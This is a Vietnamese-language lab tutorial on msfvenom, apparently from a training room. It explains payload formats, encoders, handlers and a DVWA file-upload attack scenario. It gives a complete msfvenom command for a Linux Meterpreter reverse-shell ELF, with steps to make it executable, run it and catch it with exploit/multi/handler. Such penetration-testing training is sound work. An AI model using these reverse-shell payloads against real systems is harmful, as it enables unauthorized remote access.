...
Msfvenom, phần mềm thay thế cho Msfpayload và Msfencode, cho phép bạn tạo ra các payload.

Msfvenom sẽ cho phép bạn truy cập tất cả các payload có sẵn trong Metasploit Khung phần mềm. Msfvenom cho phép bạn tạo các payload ở nhiều định dạng khác nhau ( PHP, exe, dll, elf, v.v.) và cho nhiều hệ điều hành mục tiêu khác nhau (Apple, Windows, Android, LINUX, vân vân.). 
...
Bạn có thể tạo các payload độc lập (ví dụ: tệp thực thi Windows cho Meterpreter hoặc lấy định dạng thô có thể sử dụng được (ví dụ: Python). `msfvenom --list formats` Lệnh này có thể được sử dụng để liệt kê các định dạng đầu ra được hỗ trợ. 

Bộ mã hóa

Trái ngược với một số quan niệm, các công cụ mã hóa không nhằm mục đích vượt qua phần mềm diệt virus được cài đặt trên hệ thống mục tiêu. Như tên gọi của chúng, chúng mã hóa dữ liệu cần mã hóa. Mặc dù có thể hiệu quả đối với một số phần mềm diệt virus, nhưng sử dụng các kỹ thuật làm xáo trộn hiện đại hoặc học các phương pháp để chèn shellcode là giải pháp tốt hơn cho vấn đề này. Ví dụ dưới đây cho thấy việc sử dụng mã hóa (với `-e` tham số. Phiên bản PHP của Meterpreter được mã hóa ở định dạng Base64, và định dạng đầu ra là `raw`. 

Người xử lý

Tương tự như các cuộc tấn công sử dụng reverse shell, bạn cần có khả năng chấp nhận các kết nối đến được tạo ra bởi payload của MSFvenom. Khi sử dụng một mô-đun khai thác, phần này được mô-đun khai thác tự động xử lý, bạn sẽ nhớ cách thực hiện điều đó. payload optionsTiêu đề xuất hiện khi thiết lập một reverse shell. Thuật ngữ thường được sử dụng để nhận kết nối từ mục tiêu là 'bắt shell'. Reverse shell hoặc các hàm gọi lại Meterpreter được tạo trong payload MSFvenom của bạn có thể dễ dàng bắt được bằng cách sử dụng trình xử lý.

Tình huống sau đây có thể quen thuộc; chúng ta sẽ khai thác lỗ hổng tải lên tập tin có trong DVWA (Damn Vulnerable Web Application). Đối với các bài tập trong nhiệm vụ này, bạn cần tái tạo một tình huống tương tự trên một hệ thống mục tiêu khác, DVWA được sử dụng ở đây để minh họa. Các bước khai thác như sau:

    Tạo shell PHP bằng MSFvenom.
    Khởi động trình xử lý Metasploit
    Thực thi trình thông dịch PHP

MSFvenom sẽ yêu cầu payload, địa chỉ IP của máy cục bộ và cổng cục bộ mà payload sẽ kết nối đến. Như hình bên dưới, 10.0.2.19 là địa chỉ IP của AttackBox được sử dụng trong cuộc tấn công và cổng cục bộ 7777 đã được chọn. 
...
Định dạng tệp thực thi và liên kết Linux (elf)
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
Định dạng .elf tương đương với định dạng .exe trong Windows. Đây là các tệp thực thi dành cho... Tuy nhiên, bạn vẫn cần đảm bảo rằng chúng có quyền thực thi trên máy tính trong phòng thí nghiệm. Ví dụ, sau khi bạn đã có tệp shell.elf trên máy tính trong phòng thí nghiệm, hãy sử dụng lệnh chmod +x shell.elf để cấp quyền thực thi. Sau khi hoàn tất, bạn có thể chạy tệp này bằng cách gõ `./shell.elf` trên dòng lệnh của máy tính trong phòng thí nghiệm.
...
Tất cả các ví dụ trên đều là payload đảo ngược. Điều này có nghĩa là bạn cần phải có mô-đun `exploit/multi/handler` hoạt động trên máy tấn công của mình để làm trình xử lý. Bạn cần thiết lập trình xử lý tương ứng với payload, các tham số LHOST và LPORT. Các giá trị này sẽ giống với các giá trị bạn đã sử dụng khi tạo payload `msfvenom`. 
